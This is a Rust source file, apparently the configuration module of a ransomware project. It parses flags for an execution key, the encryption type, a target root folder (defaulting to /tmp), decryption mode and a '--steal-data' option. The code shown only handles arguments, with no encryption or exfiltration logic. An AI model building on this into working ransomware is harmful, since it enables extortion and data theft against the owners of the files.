pub struct Config{          // Will contain the required configuration for the ransomware to work 
    root_directory: String, // For example: the directory to encrypt
    encryption_type: u8,    // Or the cypher type to use
    steal: bool,       // Or if the ransomware should steal data    
    decryption: bool,
}
impl Config {
    pub fn new(args: Vec<String>) -> Result<Config, &'static str> {
        let mut encryption_type: u8 = 0;
        let mut decryption_val: bool = false;
        let mut steal_val: bool = false;
        let test_dir: String = String::from("/tmp");
        let directory;
        let zero = String::from("0"); // TODO
        // this param only exists to prevent unwanted executions
        if args.len() < 3 || args[1] != "--execution-key"{
            return Err("secure parameter '--execution-key' missing as first argument");
        }
        if args[2].parse::<i32>().unwrap() != 1234 {
            return Err("Invalid execution key ");
        }
        let iterable_args = args.iter();
        // handling the param --encryption-type
        if let Some(i) = iterable_args.clone().position(|x| x.trim().to_lowercase() == "--encryption-type"){
            let encryption_type_str = args.get(i+1).unwrap_or_else(||{
                println!("Encryption type not found. Defaulting to 0");
                &zero
            });
            encryption_type = encryption_type_str.parse::<u8>().unwrap_or_else(|_|{
                println!("Encryption type (integer expected) not understood. Defaulting to 0");
                0
            });
        }
        // handling the param --decrypt
        if let Some(_) = iterable_args.clone().position(|x| x.trim().to_lowercase() == "--decrypt"){
            decryption_val = true;
        }
        // handling the param --root-folder
        if let Some(j) = iterable_args.clone().position(|x| x.trim().to_lowercase() == "--root-folder"){
            directory = args.get(j+1).unwrap_or_else(||{
                println!("Encryption directory not found. Defaulting to the test directory.");
                &test_dir
            }).to_string();
        } else {
            println!("'--root-folder' parameter not found. Defaulting to the test directory");
            directory = test_dir;
        }
        if let Some(_) = iterable_args.clone().position(|x| x.trim().to_lowercase() == "--steal-data"){
            steal_val = true;
        }
        Ok(Config{
            encryption_type : encryption_type,
            decryption : decryption_val,
            steal : steal_val,
            root_directory: directory,
        })
    }
    pub fn decrypt(&self) -> bool {
        return self.decryption.clone();
    }
    pub fn get_enc_type(&self) -> u8{
        return self.encryption_type.clone();
    }
    pub fn get_directory(&self) -> String{
        return self.root_directory.clone();
    }
    pub fn edit_dir(&mut self, new_dir: String) {
        self.root_directory = new_dir;
    }
    pub fn steal(&self) -> bool {
        return self.steal.clone();
    }
}
